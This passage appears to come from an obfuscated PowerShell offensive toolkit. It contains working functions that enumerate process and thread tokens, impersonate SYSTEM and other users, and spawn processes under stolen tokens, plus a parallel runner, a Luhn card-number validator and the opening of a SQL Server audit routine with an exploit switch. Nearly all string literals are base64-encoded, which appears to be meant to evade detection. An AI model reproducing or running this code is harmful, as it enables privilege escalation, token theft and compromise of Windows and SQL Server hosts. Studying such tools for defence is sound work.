            $NewHToken = [IntPtr]::Zero
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
            }
        }
    }
    function Free-AllTokens
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [PSObject[]]
            $TokenInfoObjs
        )
        foreach ($Obj in $TokenInfoObjs)
        {
            $Success = $CloseHandle.Invoke($Obj.hToken)
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Verbose "Failed to close token handle in Free-AllTokens. ErrorCode: $ErrorCode"
            }
            $Obj.hToken = [IntPtr]::Zero
        }
    }
    function Enum-AllTokens
    {
        $AllTokens = @()
        $systemTokenInfo = Get-PrimaryToken -ProcessId (ps wininit | where {$_.SessionId -eq 0}).Id
        if ($systemTokenInfo -eq $null -or (-not (Invoke-ImpersonateUser -hToken $systemTokenInfo.hProcToken)))
        {
            Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABTAFkAUwBUAEUATQAsACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAHcAaQBsAGwAIABuAG8AdAAgAGIAZQAgAGEAYgBsAGUAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQAgAGEAbABsACAAdABvAGsAZQBuAHMA')))
        }
        if ($systemTokenInfo -ne $null -and $systemTokenInfo.hProcToken -ne [IntPtr]::Zero)
        {
            $CloseHandle.Invoke($systemTokenInfo.hProcToken) | Out-Null
            $systemTokenInfo = $null
        }
        $ProcessIds = get-process | where {$_.name -inotmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBjAHMAcgBzAHMAJAA='))) -and $_.name -inotmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBzAHkAcwB0AGUAbQAkAA=='))) -and $_.id -ne 0}
        foreach ($Process in $ProcessIds)
        {
            $PrimaryTokenInfo = (Get-PrimaryToken -ProcessId $Process.Id -FullPrivs)
            if ($PrimaryTokenInfo -ne $null)
            {
                [IntPtr]$hToken = [IntPtr]$PrimaryTokenInfo.hProcToken
                if ($hToken -ne [IntPtr]::Zero)
                {
                    $ReturnObj = Get-TokenInformation -hToken $hToken
                    if ($ReturnObj -ne $null)
                    {
                        $ReturnObj | Add-Member -MemberType NoteProperty -Name ProcessId -Value $Process.Id
                        $AllTokens += $ReturnObj
                    }
                }
                else
                {
                    Write-Warning "Couldn't retrieve token for Process: $($Process.Name). ProcessId: $($Process.Id)"
                }
                foreach ($Thread in $Process.Threads)
                {
                    $ThreadTokenInfo = Get-ThreadToken -ThreadId $Thread.Id
                    [IntPtr]$hToken = ($ThreadTokenInfo.hThreadToken)
                    if ($hToken -ne [IntPtr]::Zero)
                    {
                        $ReturnObj = Get-TokenInformation -hToken $hToken
                        if ($ReturnObj -ne $null)
                        {
                            $ReturnObj | Add-Member -MemberType NoteProperty -Name ThreadId -Value $Thread.Id
                            $AllTokens += $ReturnObj
                        }
                    }
                }
            }
        }
        return $AllTokens
    }
    function Invoke-RevertToSelf
    {
        Param(
            [Parameter(Position=0)]
            [Switch]
            $ShowOutput
        )
        $Success = $RevertToSelf.Invoke()
        if ($ShowOutput)
        {
            if ($Success)
            {
                echo "RevertToSelf was successful. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
            else
            {
                echo "RevertToSelf failed. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
        }
    }
    function Main
    {   
        if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
        {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwAgAGkAbgAgAFMAZQBzAHMAaQBvAG4AIAAwACwAIABmAG8AcgBjAGkAbgBnACAATgBvAFUASQAgACgAcAByAG8AYwBlAHMAcwBlAHMAIABpAG4AIABTAGUAcwBzAGkAbwBuACAAMAAgAGMAYQBuAG4AbwB0ACAAaABhAHYAZQAgAGEAIABVAEkAKQA=')))
            $NoUI = $true
        }
        if ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHYAVABvAFMAZQBsAGYA'))))
        {
            Invoke-RevertToSelf -ShowOutput
        }
        elseif ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwA='))) -or $PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABlAFUAcwBlAHIA'))))
        {
            $AllTokens = Enum-AllTokens
            [IntPtr]$hToken = [IntPtr]::Zero
            $UniqueTokens = (Get-UniqueTokens -AllTokens $AllTokens).TokenByUser
            if ($Username -ne $null -and $Username -ne '')
            {
                if ($UniqueTokens.ContainsKey($Username))
                {
                    $hToken = $UniqueTokens[$Username].hToken
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGwAZQBjAHQAaQBuAGcAIAB0AG8AawBlAG4AIABiAHkAIAB1AHMAZQByAG4AYQBtAGUA')))
                }
                else
                {
                    Write-Error "A token belonging to the specified username was not found. Username: $($Username)" -ErrorAction Stop
                }
            }
            elseif ( $ProcessId -ne $null -and $ProcessId -ne 0)
            {
                foreach ($Token in $AllTokens)
                {
                    if (($Token | gm ProcessId) -and $Token.ProcessId -eq $ProcessId)
                    {
                        $hToken = $Token.hToken
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGwAZQBjAHQAaQBuAGcAIAB0AG8AawBlAG4AIABiAHkAIABQAHIAbwBjAGUAcwBzAEkARAA=')))
                    }
                }
                if ($hToken -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to ProcessId $($ProcessId) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            elseif ($ThreadId -ne $null -and $ThreadId -ne 0)
            {
                foreach ($Token in $AllTokens)
                {
                    if (($Token | gm ThreadId) -and $Token.ThreadId -eq $ThreadId)
                    {
                        $hToken = $Token.hToken
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGwAZQBjAHQAaQBuAGcAIAB0AG8AawBlAG4AIABiAHkAIABUAGgAcgBlAGEAZABJAGQA')))
                    }
                }
                if ($hToken -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to ThreadId $($ThreadId) could not be found. Either the thread doesn't exist or the thread is in a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            elseif ($Process -ne $null)
            {
                foreach ($Token in $AllTokens)
                {
                    if (($Token | gm ProcessId) -and $Token.ProcessId -eq $Process.Id)
                    {
                        $hToken = $Token.hToken
                        if($Instance){
                            Write-Verbose "$Instance : Selecting token by Process object"
                        }else{
                            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGwAZQBjAHQAaQBuAGcAIAB0AG8AawBlAG4AIABiAHkAIABQAHIAbwBjAGUAcwBzACAAbwBiAGoAZQBjAHQA')))
                        }
                    }
                }
                if ($hToken -eq [IntPtr]::Zero)
                {
                    Write-Error "A token belonging to Process $($Process.Name) ProcessId $($Process.Id) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
                }
            }
            else
            {
                Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB1AHMAdAAgAHMAdQBwAHAAbAB5ACAAYQAgAFUAcwBlAHIAbgBhAG0AZQAsACAAUAByAG8AYwBlAHMAcwBJAGQALAAgAFQAaAByAGUAYQBkAEkAZAAsACAAbwByACAAUAByAG8AYwBlAHMAcwAgAG8AYgBqAGUAYwB0AA==')))  -ErrorAction Stop
            }
            if ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwA='))))
            {
                if (-not $NoUI)
                {
                    Set-DesktopACLs
                }
                Create-ProcessWithToken -hToken $hToken -ProcessName $CreateProcess -ProcessArgs $ProcessArgs -PassThru:$PassThru
                Invoke-RevertToSelf
            }
            elseif ($ImpersonateUser)
            {
                Invoke-ImpersonateUser -hToken $hToken | Out-Null
                echo "Running As: $([Environment]::UserDomainName)\$([Environment]::UserName)"
            }
            Free-AllTokens -TokenInfoObjs $AllTokens
        }
        elseif ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAG8AQQBtAEkA'))))
        {
            echo "$([Environment]::UserDomainName)\$([Environment]::UserName)"
        }
        else 
        {
            $AllTokens = Enum-AllTokens
            if ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAG8AdwBBAGwAbAA='))))
            {
                echo $AllTokens
            }
            else
            {
                echo (Get-UniqueTokens -AllTokens $AllTokens).TokenByUser.Values
            }
            Invoke-RevertToSelf
            Free-AllTokens -TokenInfoObjs $AllTokens
        }
    }
    Main
}
function Test-IsLuhnValid
{
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline = $true)]
        [uint64]$Number
    )
    $numberDigits = ConvertTo-Digits -Number $Number
    $checksumDigit = $numberDigits[-1]
    $numberWithoutChecksumDigit = $numberDigits[0..($numberDigits.Count - 2)] -join ''
    $checksum = Get-LuhnCheckSum -Number $numberWithoutChecksumDigit
    $NumCount = ([string]$numberWithoutChecksumDigit).Length
    if ((($checksum + $checksumDigit) % 10) -eq 0 -and $NumCount -ge 12)
    {
        echo -InputObject $true
    }
    else
    {
        echo -InputObject $false
    }
}
function ConvertTo-Digits
{
    [OutputType([System.Byte[]])]
    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
        [uint64]$Number
    )
    $n = $Number
    $numberOfDigits = 1 + [convert]::ToUInt64([math]::Floor(([math]::Log10($n))))
    $digits = New-Object -TypeName Byte[] -ArgumentList $numberOfDigits
    for ($i = ($numberOfDigits - 1); $i -ge 0; $i--)
    {
        $digit = $n % 10
        $digits[$i] = $digit
        $n = [math]::Floor($n / 10)
    }
    echo -InputObject $digits
}
function Invoke-Parallel
{
    [cmdletbinding(DefaultParameterSetName = 'ScriptBlock')]
    Param (
        [Parameter(Mandatory = $false,position = 0,ParameterSetName = 'ScriptBlock')]
        [System.Management.Automation.ScriptBlock]$ScriptBlock,
        [Parameter(Mandatory = $false,ParameterSetName = 'ScriptFile')]
        [ValidateScript({
                    Test-Path $_ -PathType leaf
        })]
        $ScriptFile,
        [Parameter(Mandatory = $true,ValueFromPipeline = $true)]
        [Alias('CN','__Server','IPAddress','Server','ComputerName')]
        [PSObject]$InputObject,
        [PSObject]$Parameter,
        [switch]$ImportSessionFunctions,
        [switch]$ImportVariables,
        [switch]$ImportModules,
        [int]$Throttle = 20,
        [int]$SleepTimer = 200,
        [int]$RunspaceTimeout = 0,
        [switch]$NoCloseOnTimeout = $false,
        [int]$MaxQueue,
        [validatescript({
                    Test-Path (Split-Path -Path $_ -Parent)
        })]
        [string]$LogFile = 'C:\temp\log.log',
        [switch] $Quiet = $false
    )
    Begin {
        if( -not $PSBoundParameters.ContainsKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAUQB1AGUAdQBlAA==')))) )
        {
            if($RunspaceTimeout -ne 0)
            {
                $script:MaxQueue = $Throttle
            }
            else
            {
                $script:MaxQueue = $Throttle * 3
            }
        }
        else
        {
            $script:MaxQueue = $MaxQueue
        }
        if ($ImportVariables -or $ImportModules)
        {
            $StandardUserEnv = [powershell]::Create().addscript({
                    $Modules = gmo | select -ExpandProperty Name
                    $Snapins = Get-PSSnapin | select -ExpandProperty Name
                    $Variables = gv | select -ExpandProperty Name
                    @{
                        Variables = $Variables
                        Modules   = $Modules
                        Snapins   = $Snapins
                    }
            }).invoke()[0]
            if ($ImportVariables)
            {
                Function _temp
                {
                    [cmdletbinding()] param()
                }
                $VariablesToExclude = @( (gcm _temp | select -ExpandProperty parameters).Keys + $PSBoundParameters.Keys + $StandardUserEnv.Variables )
                $UserVariables = @( gv | ? -FilterScript {
                        -not ($VariablesToExclude -contains $_.Name)
                } )
            }
            if ($ImportModules)
            {
                $UserModules = @( gmo |
                    ? -FilterScript {
                        $StandardUserEnv.Modules -notcontains $_.Name -and (Test-Path -Path $_.Path -ErrorAction SilentlyContinue)
                    } |
                select -ExpandProperty Path )
                $UserSnapins = @( Get-PSSnapin |
                    select -ExpandProperty Name |
                    ? -FilterScript {
                        $StandardUserEnv.Snapins -notcontains $_
                } )
            }
        }
        Function Get-RunspaceData
        {
            [cmdletbinding()]
            param( [switch]$Wait )
            Do
            {
                $more = $false
                if (-not $Quiet)
                {
                    Write-Progress  -Activity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwAgAFEAdQBlAHIAeQA='))) -Status $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AGkAbgBnACAAdABoAHIAZQBhAGQAcwA=')))`
                    -CurrentOperation "$startedCount threads defined - $totalCount input objects - $script:completedCount input objects processed"`
                    -PercentComplete $( Try
                        {
                            $script:completedCount / $totalCount * 100
                        }
                        Catch
                        {
                            0
                        }
                    )
                }
                Foreach($runspace in $runspaces)
                {
                    $currentdate = Get-Date
                    $runtime = $currentdate - $runspace.startTime
                    $runMin = [math]::Round( $runtime.totalminutes ,2 )
                    $log = '' | select -Property Date, Action, Runtime, Status, Details
                    $log.Action = "Removing:'$($runspace.object)'"
                    $log.Date = $currentdate
                    $log.Runtime = "$runMin minutes"
                    If ($runspace.Runspace.isCompleted)
                    {
                        $script:completedCount++
                        if($runspace.powershell.Streams.Error.Count -gt 0)
                        {
                            $log.status = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcABsAGUAdABlAGQAVwBpAHQAaABFAHIAcgBvAHIAcwA=')))
                            foreach($ErrorRecord in $runspace.powershell.Streams.Error)
                            {
                                Write-Error -ErrorRecord $ErrorRecord
                            }
                        }
                        else
                        {
                            $log.status = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcABsAGUAdABlAGQA')))
                        }
                        $runspace.powershell.EndInvoke($runspace.Runspace)
                        $runspace.powershell.dispose()
                        $runspace.Runspace = $null
                        $runspace.powershell = $null
                    }
                    ElseIf ( $RunspaceTimeout -ne 0 -and $runtime.totalseconds -gt $RunspaceTimeout)
                    {
                        $script:completedCount++
                        $timedOutTasks = $true
                        $log.status = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBkAE8AdQB0AA==')))
                        Write-Error -Message "Runspace timed out at $($runtime.totalseconds) seconds for the object:`n$($runspace.object | Out-String)"
                        if (!$NoCloseOnTimeout)
                        {
                            $runspace.powershell.dispose()
                        }
                        $runspace.Runspace = $null
                        $runspace.powershell = $null
                        $completedCount++
                    }
                    ElseIf ($runspace.Runspace -ne $null )
                    {
                        $log = $null
                        $more = $true
                    }
                }
                $temphash = $runspaces.clone()
                $temphash |
                ? -FilterScript {
                    $_.runspace -eq $null
                } |
                % -Process {
                    $runspaces.remove($_)
                }
                if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBhAGkAdAA=')))])
                {
                    sleep -Milliseconds $SleepTimer
                }
            }
            while ($more -and $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBhAGkAdAA=')))])
        }
        if($PSCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAHIAaQBwAHQARgBpAGwAZQA='))))
        {
            $ScriptBlock = [scriptblock]::Create( $(gc $ScriptFile | Out-String) )
        }
        elseif($PSCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAHIAaQBwAHQAQgBsAG8AYwBrAA=='))))
        {
            [string[]]$ParamsToAdd = '$_'
            if( $PSBoundParameters.ContainsKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAYQBtAGUAdABlAHIA')))) )
            {
                $ParamsToAdd += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABQAGEAcgBhAG0AZQB0AGUAcgA=')))
            }
            $UsingVariableData = $null
            if($PSVersionTable.PSVersion.Major -gt 2)
            {
                $UsingVariables = $ScriptBlock.ast.FindAll({
                        $args[0] -is [System.Management.Automation.Language.UsingExpressionAst]
                },$true)
                If ($UsingVariables)
                {
                    $List = New-Object -TypeName $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBDAG8AbABsAGUAYwB0AGkAbwBuAHMALgBHAGUAbgBlAHIAaQBjAC4ATABpAHMAdABgADEAWwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4ATABhAG4AZwB1AGEAZwBlAC4AVgBhAHIAaQBhAGIAbABlAEUAeABwAHIAZQBzAHMAaQBvAG4AQQBzAHQAXQA=')))
                    ForEach ($Ast in $UsingVariables)
                    {
                        [void]$List.Add($Ast.SubExpression)
                    }
                    $UsingVar = $UsingVariables |
                    group -Property SubExpression |
                    % -Process {
                        $_.Group |
                        select -First 1
                    }
                    $UsingVariableData = ForEach ($Var in $UsingVar)
                    {
                        Try
                        {
                            $Value = gv -Name $Var.SubExpression.VariablePath.UserPath -ErrorAction Stop
                            [pscustomobject]@{
                                Name       = $Var.SubExpression.Extent.Text
                                Value      = $Value.Value
                                NewName    = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABfAF8AdQBzAGkAbgBnAF8AewAwAH0A'))) -f $Var.SubExpression.VariablePath.UserPath)
                                NewVarName = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBfAHUAcwBpAG4AZwBfAHsAMAB9AA=='))) -f $Var.SubExpression.VariablePath.UserPath)
                            }
                        }
                        Catch
                        {
                            Write-Error -Message "$($Var.SubExpression.Extent.Text) is not a valid Using: variable!"
                        }
                    }
                    $ParamsToAdd += $UsingVariableData | select -ExpandProperty NewName -Unique
                    $NewParams = $UsingVariableData.NewName -join ', '
                    $Tuple = [Tuple]::Create($List, $NewParams)
                    $bindingFlags = [Reflection.BindingFlags]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGYAYQB1AGwAdAAsAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlAA==')))
                    $GetWithInputHandlingForInvokeCommandImpl = ($ScriptBlock.ast.gettype().GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVwBpAHQAaABJAG4AcAB1AHQASABhAG4AZABsAGkAbgBnAEYAbwByAEkAbgB2AG8AawBlAEMAbwBtAG0AYQBuAGQASQBtAHAAbAA='))),$bindingFlags))
                    $StringScriptBlock = $GetWithInputHandlingForInvokeCommandImpl.Invoke($ScriptBlock.ast,@($Tuple))
                    $ScriptBlock = [scriptblock]::Create($StringScriptBlock)
                }
            }
            $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock("param($($ParamsToAdd -Join ', '))`r`n" + $ScriptBlock.ToString())
        }
        else
        {
            Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB1AHMAdAAgAHAAcgBvAHYAaQBkAGUAIABTAGMAcgBpAHAAdABCAGwAbwBjAGsAIABvAHIAIABTAGMAcgBpAHAAdABGAGkAbABlAA==')))
            Break
        }
        Write-Debug -Message "`$ScriptBlock: $($ScriptBlock | Out-String)"
        If (-not($SuppressVerbose)){
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbgBnACAAcgB1AG4AcwBwAGEAYwBlACAAcABvAG8AbAAgAGEAbgBkACAAcwBlAHMAcwBpAG8AbgAgAHMAdABhAHQAZQBzAA==')))
        }
        $sessionstate = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        if ($ImportVariables)
        {
            if($UserVariables.count -gt 0)
            {
                foreach($Variable in $UserVariables)
                {
                    $sessionstate.Variables.Add( (New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Variable.Name, $Variable.Value, $null) )
                }
            }
        }
        if ($ImportModules)
        {
            if($UserModules.count -gt 0)
            {
                foreach($ModulePath in $UserModules)
                {
                    $sessionstate.ImportPSModule($ModulePath)
                }
            }
            if($UserSnapins.count -gt 0)
            {
                foreach($PSSnapin in $UserSnapins)
                {
                    [void]$sessionstate.ImportPSSnapIn($PSSnapin, [ref]$null)
                }
            }
        }
        if($ImportSessionFunctions)
        {
            ls -Path Function:\ |
            ? -FilterScript {
                $_.name -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgA6ACoA')))
            } |
            select -Property name -ExpandProperty name |
            % -Process {
                $Definition = gc -Path "function:\$_" -ErrorAction Stop
                $SessionStateFunction = New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList "$_", $Definition
                $sessionstate.Commands.Add($SessionStateFunction)
            }
        }
        $runspacepool = [runspacefactory]::CreateRunspacePool(1, $Throttle, $sessionstate, $Host)
        $runspacepool.Open()
        $Script:runspaces = New-Object -TypeName System.Collections.ArrayList
        $bound = $PSBoundParameters.keys -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AE8AYgBqAGUAYwB0AA==')))
        if(-not $bound)
        {
            [System.Collections.ArrayList]$allObjects = @()
        }
        $timedOutTasks = $false
    }
    Process {
        if($bound)
        {
            $allObjects = $InputObject
        }
        Else
        {
            [void]$allObjects.add( $InputObject )
        }
    }
    End {
        Try
        {
            $totalCount = $allObjects.count
            $script:completedCount = 0
            $startedCount = 0
            foreach($object in $allObjects)
            {
                $powershell = [powershell]::Create()
                if ($VerbosePreference -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA=='))))
                {
                    [void]$powershell.AddScript({
                            $VerbosePreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
                    })
                }
                [void]$powershell.AddScript($ScriptBlock).AddArgument($object)
                if ($Parameter)
                {
                    [void]$powershell.AddArgument($Parameter)
                }
                if ($UsingVariableData)
                {
                    Foreach($UsingVariable in $UsingVariableData)
                    {
                        [void]$powershell.AddArgument($UsingVariable.Value)
                    }
                }
                $powershell.RunspacePool = $runspacepool
                $temp = '' | select -Property PowerShell, StartTime, object, Runspace
                $temp.PowerShell = $powershell
                $temp.StartTime = Get-Date
                $temp.object = $object
                $temp.Runspace = $powershell.BeginInvoke()
                $startedCount++
                $null = $runspaces.Add($temp)
                Get-RunspaceData
                $firstRun = $true
                while ($runspaces.count -ge $script:MaxQueue)
                {
                    if($firstRun)
                    {
                    }
                    $firstRun = $false
                    Get-RunspaceData
                    sleep -Milliseconds $SleepTimer
                }
            }
            Get-RunspaceData -wait
            if (-not $Quiet)
            {
                Write-Progress -Activity $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwAgAFEAdQBlAHIAeQA='))) -Status $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AGkAbgBnACAAdABoAHIAZQBhAGQAcwA='))) -Completed
            }
        }
        Finally
        {
            if ( ($timedOutTasks -eq $false) -or ( ($timedOutTasks -eq $true) -and ($NoCloseOnTimeout -eq $false) ) )
            {
                If (-not($SuppressVerbose)){
                    Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBpAG4AZwAgAHQAaABlACAAcgB1AG4AcwBwAGEAYwBlACAAcABvAG8AbAA=')))
                }
                $runspacepool.close()
            }
            [gc]::Collect()
        }
    }
}
function Test-Subnet ([string]$cidr, [string]$ip)
{
    $network, [int]$subnetlen = $cidr.Split('/')
    $a = [uint32[]]$network.split('.')
    [uint32] $unetwork = ($a[0] -shl 24) + ($a[1] -shl 16) + ($a[2] -shl 8) + $a[3]
    $mask = (-bnot [uint32]0) -shl (32 - $subnetlen)
    $a = [uint32[]]$ip.split('.')
    [uint32] $uip = ($a[0] -shl 24) + ($a[1] -shl 16) + ($a[2] -shl 8) + $a[3]
    $unetwork -eq ($mask -band $uip)
}
Function Invoke-SQLAudit
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Folder to write results to csv.')]
        [string]$OutFolder
    )
    Begin
    {
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = $TblData.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
        $TblVulnFunc = New-Object -TypeName System.Data.DataTable
        $null = $TblVulnFunc.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AG4AYwB0AGkAbwBuAE4AYQBtAGUA'))))
        $null = $TblVulnFunc.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAB5AHAAZQA='))))
        $TblVulnFunc.Clear()
        Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABPAEEARABJAE4ARwAgAFYAVQBMAE4ARQBSAEEAQgBJAEwASQBUAFkAIABDAEgARQBDAEsAUwAuAA==')))
        $null = $TblVulnFunc.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQARABlAGYAYQB1AGwAdABMAG8AZwBpAG4AUAB3ACAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))))   
        $null = $TblVulnFunc.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAVwBlAGEAawBMAG8AZwBpAG4AUAB3AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))))
        $null = $TblVulnFunc.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUAByAGkAdgBJAG0AcABlAHIAcwBvAG4AYQB0AGUATABvAGcAaQBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))))
